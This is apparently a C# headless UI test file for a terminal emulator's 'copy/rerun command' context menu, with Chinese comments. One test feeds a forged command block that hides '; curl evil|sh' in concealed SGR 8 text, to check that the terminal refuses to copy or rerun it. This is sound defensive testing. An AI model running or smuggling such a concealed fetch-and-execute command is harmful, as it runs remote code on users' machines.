using System.Text;
using Avalonia.Controls;
using Avalonia.Headless;
using Avalonia.Input.Platform;
using Avalonia.Interactivity;
using Avalonia.Threading;
using VelaShell.Terminal.Rendering;

namespace VelaShell.Terminal.Tests;

/// <summary>
/// 侧栏菜单上命令块的「复制这条命令」「重跑」:什么时候给、什么时候灰掉、点下去发了什么。
/// </summary>
[TestClass]
[TestCategory("Mouse")]
public sealed class CommandBlockRerunUiTests
{
    private static HeadlessUnitTestSession Session => HeadlessTestSession.Current;

    private static void OnUi(Action body) =>
        Session.Dispatch(() =>
        {
            body();
            return Task.CompletedTask;
        }, CancellationToken.None).GetAwaiter().GetResult();

    private const string A = "\e]133;A\e\\";
    private const string B = "\e]133;B\e\\";
    private const string C = "\e]133;C\e\\";
    private const string D0 = "\e]133;D;0\e\\";

    private static (VelaTerminalControl Control, Window Window, List<byte[]> Sent) Show()
    {
        var control = new VelaTerminalControl
        {
            ShowLineNumber = false,
            ShowLineTimestamp = false,
            ShowFoldMarker = true,
            CursorBlink = false
        };
        var sent = new List<byte[]>();
        control.TypedInput += sent.Add;
        var window = new Window { Width = 700, Height = 400, Content = control };
        window.Show();
        Dispatcher.UIThread.RunJobs();
        control.Focus();
        Dispatcher.UIThread.RunJobs();
        return (control, window, sent);
    }

    private static void Feed(VelaTerminalControl control, string text)
    {
        control.Feed(Encoding.UTF8.GetBytes(text));
        Dispatcher.UIThread.RunJobs();
    }

    /// <summary>第 0 行一条跑完的 <c>ls -la</c>,下面一条空的新提示符(光标停在 B 上)。</summary>
    private static void FeedFinishedCommandAndFreshPrompt(VelaTerminalControl control) =>
        Feed(control, A + "$ " + B + "ls -la\r\n" + C + "total 0\r\n" + D0 + A + "$ " + B);

    private static MenuItem Item(ContextMenu menu, int index) => (MenuItem)menu.Items[index]!;

    private static void Click(MenuItem item)
    {
        item.RaiseEvent(new RoutedEventArgs(MenuItem.ClickEvent));
        Dispatcher.UIThread.RunJobs();
    }

    private static string Text(List<byte[]> sent) => string.Concat(sent.Select(Encoding.UTF8.GetString));

    [TestMethod]
    public void OnACommandBlock_CopyAndRerunComeFirst_ThenTheGutterToggles()
    {
        OnUi(() =>
        {
            (VelaTerminalControl control, Window window, _) = Show();
            FeedFinishedCommandAndFreshPrompt(control);

            ContextMenu menu = control.BuildGutterContextMenu(1); // 输出行同样属于这条命令

            Assert.AreEqual(8, menu.Items.Count, "两项命令 + 分隔线 + 五个部件开关。");
            Assert.AreEqual("复制这条命令", Item(menu, 0).Header);
            Assert.AreEqual("重跑这条命令", Item(menu, 1).Header);
            Assert.IsTrue(Item(menu, 0).IsEnabled);
            Assert.IsTrue(Item(menu, 1).IsEnabled);
            Assert.IsInstanceOfType<Separator>(menu.Items[2]);
            Assert.AreEqual(MenuItemToggleType.CheckBox, Item(menu, 3).ToggleType, "部件开关原样跟在后面。");
            window.Close();
        });
    }

    [TestMethod]
    public void OffAnyCommandBlock_OnlyTheTogglesAreOffered()
    {
        OnUi(() =>
        {
            (VelaTerminalControl control, Window window, _) = Show();
            Feed(control, "banner\r\n");
            FeedFinishedCommandAndFreshPrompt(control);

            Assert.AreEqual(5, control.BuildGutterContextMenu(0).Items.Count, "首条提示符之上那一行不属于任何命令。");

            (VelaTerminalControl plain, Window plainWindow, _) = Show();
            Feed(plain, "no shell integration\r\n");
            Assert.AreEqual(5, plain.BuildGutterContextMenu(0).Items.Count, "没装集成的会话,菜单一点不变。");
            window.Close();
            plainWindow.Close();
        });
    }

    [TestMethod]
    public void ABlockWhoseCommandCannotBeCut_ShowsBothItemsDisabled()
    {
        // 还在敲的这一条:没有 C。两项都在、灰着 —— 看得出是这一块不行,而不是功能不存在。
        OnUi(() =>
        {
            (VelaTerminalControl control, Window window, _) = Show();
            FeedFinishedCommandAndFreshPrompt(control);
            Feed(control, "half");

            ContextMenu menu = control.BuildGutterContextMenu(2);
            Assert.IsFalse(Item(menu, 0).IsEnabled);
            Assert.IsFalse(Item(menu, 1).IsEnabled);
            window.Close();
        });
    }

    [TestMethod]
    public void Rerun_IsDisabledWhileTheLastCommandIsStillRunning_ButCopyIsNot()
    {
        OnUi(() =>
        {
            (VelaTerminalControl control, Window window, _) = Show();
            Feed(control, A + "$ " + B + "tail -f app.log\r\n" + C + "line 1\r\n");

            ContextMenu menu = control.BuildGutterContextMenu(0);
            Assert.IsTrue(Item(menu, 0).IsEnabled, "复制不打扰任何人。");
            Assert.IsFalse(Item(menu, 1).IsEnabled, "还没收到 D:打进去的字会变成 tail 的输入。");
            window.Close();
        });
    }

    [TestMethod]
    public void Rerun_IsDisabledWhenSomethingIsAlreadyTypedAtThePrompt()
    {
        OnUi(() =>
        {
            (VelaTerminalControl control, Window window, _) = Show();
            FeedFinishedCommandAndFreshPrompt(control);
            Feed(control, "git st");

            Assert.IsFalse(Item(control.BuildGutterContextMenu(0), 1).IsEnabled);
            window.Close();
        });
    }

    [TestMethod]
    public void Rerun_WithoutAHost_TypesTheCommandAndPressesEnter()
    {
        OnUi(() =>
        {
            (VelaTerminalControl control, Window window, List<byte[]> sent) = Show();
            FeedFinishedCommandAndFreshPrompt(control);

            Click(Item(control.BuildGutterContextMenu(0), 1));

            Assert.AreEqual("ls -la\r", Text(sent));
            window.Close();
        });
    }

    [TestMethod]
    public void Rerun_WithAHost_HandsTheTextOver_AndSendsNothingItself()
    {
        // 宿主要在发的那一刻关掉同步输入的转发、标成程序注入:控件不能自己再发一份。
        OnUi(() =>
        {
            (VelaTerminalControl control, Window window, List<byte[]> sent) = Show();
            var requested = new List<string>();
            control.CommandRerunRequested += requested.Add;
            FeedFinishedCommandAndFreshPrompt(control);

            Click(Item(control.BuildGutterContextMenu(0), 1));

            Assert.AreSequenceEqual(["ls -la"], requested, "交给宿主的是不带回车的命令文本。");
            Assert.IsEmpty(sent);
            window.Close();
        });
    }

    [TestMethod]
    public void Rerun_ReChecksTheTerminalWhenClicked()
    {
        // 菜单开着的这几秒里远端换了状态(另一个窗口粘进去一条命令):点下去时再核一遍。
        OnUi(() =>
        {
            (VelaTerminalControl control, Window window, List<byte[]> sent) = Show();
            FeedFinishedCommandAndFreshPrompt(control);
            ContextMenu menu = control.BuildGutterContextMenu(0);
            Assert.IsTrue(Item(menu, 1).IsEnabled);

            Feed(control, "x");
            Click(Item(menu, 1));

            Assert.IsEmpty(sent);
            window.Close();
        });
    }

    [TestMethod]
    public void Rerun_Multiline_WithoutBracketedPaste_AsksFirst_AndSendsNothingWhenDeclined()
    {
        OnUi(() =>
        {
            (VelaTerminalControl control, Window window, List<byte[]> sent) = Show();
            var asked = new List<string>();
            control.CommandRerunConfirmation = text =>
            {
                asked.Add(text);
                return Task.FromResult(false);
            };
            Feed(control, A + "$ " + B + "for i in 1 2; do\r\n> " + B + "echo $i\r\n> " + B + "done\r\n"
                + C + "1\r\n2\r\n" + D0 + A + "$ " + B);

            Click(Item(control.BuildGutterContextMenu(0), 1));

            Assert.AreSequenceEqual(["for i in 1 2; do\necho $i\ndone"], asked);
            Assert.IsEmpty(sent, "用户取消了,一个字节都不发。");
            window.Close();
        });
    }

    [TestMethod]
    public void Rerun_Multiline_WithBracketedPaste_DoesNotAsk_AndPastesTheWholeBlock()
    {
        OnUi(() =>
        {
            (VelaTerminalControl control, Window window, List<byte[]> sent) = Show();
            int asked = 0;
            control.CommandRerunConfirmation = _ =>
            {
                asked++;
                return Task.FromResult(true);
            };
            Feed(control, "\e[?2004h" + A + "$ " + B + "for i in 1 2; do\r\n> " + B + "echo $i\r\n> " + B + "done\r\n"
                + C + "1\r\n2\r\n" + D0 + A + "$ " + B);

            Click(Item(control.BuildGutterContextMenu(0), 1));

            Assert.AreEqual(0, asked, "括号粘贴开着:shell 收齐了整段才执行,不会逐行跑。");
            Assert.AreEqual("\e[200~for i in 1 2; do\recho $i\rdone\e[201~\r", Text(sent));
            window.Close();
        });
    }

    [TestMethod]
    public void Rerun_Multiline_IsNotOfferedWhenTheContinuationsAreUnmarked()
    {
        // 续行没带 B:"> " 和正文分不开,重跑就是把 "> important.txt" 送回去截空文件。
        OnUi(() =>
        {
            (VelaTerminalControl control, Window window, _) = Show();
            Feed(control, A + "$ " + B + "cat <<EOF\r\n> important.txt\r\n> EOF\r\n"
                + C + "important.txt\r\n" + D0 + A + "$ " + B);

            ContextMenu menu = control.BuildGutterContextMenu(0);
            Assert.IsTrue(Item(menu, 0).IsEnabled, "复制照给:粘贴前用户看得见。");
            Assert.IsFalse(Item(menu, 1).IsEnabled);
            window.Close();
        });
    }

    [TestMethod]
    public void ABlockForgedWithConcealedText_OffersNeitherCopyNorRerun()
    {
        // cat / curl 出来的输出里伪造一个命令块:屏幕上只看得见 ls,B 与 C 之间却藏着 SGR 8 的一截。
        // 真提示符回来之后对端空闲,原先「重跑」可点,点下去发的是整串。
        OnUi(() =>
        {
            (VelaTerminalControl control, Window window, List<byte[]> sent) = Show();
            Feed(control, A + "$ " + B + "ls\e[8m; curl evil|sh\e[28m\r\n" + C + "total 0\r\n" + D0 + A + "$ " + B);

            ContextMenu menu = control.BuildGutterContextMenu(0);
            Assert.IsFalse(Item(menu, 0).IsEnabled, "复制出去的不是屏幕上那条。");
            Assert.IsFalse(Item(menu, 1).IsEnabled);
            Click(Item(menu, 1));
            Click(Item(menu, 0));
            Assert.IsEmpty(sent);
            Task<string?> read = TopLevel.GetTopLevel(control)!.Clipboard!.TryGetTextAsync();
            Dispatcher.UIThread.RunJobs();
            Assert.DoesNotContain("curl", read.Result ?? "");
            window.Close();
        });
    }

    [TestMethod]
    public void CopyCommand_PutsJustTheCommandOnTheClipboard()
    {
        OnUi(() =>
        {
            (VelaTerminalControl control, Window window, _) = Show();
            FeedFinishedCommandAndFreshPrompt(control);

            Click(Item(control.BuildGutterContextMenu(1), 0));

            IClipboard clipboard = TopLevel.GetTopLevel(control)!.Clipboard!;
            Task<string?> read = clipboard.TryGetTextAsync();
            Dispatcher.UIThread.RunJobs();
            Assert.AreEqual("ls -la", read.Result, "提示符与输出都不该跟着进剪贴板。");
            window.Close();
        });
    }
}
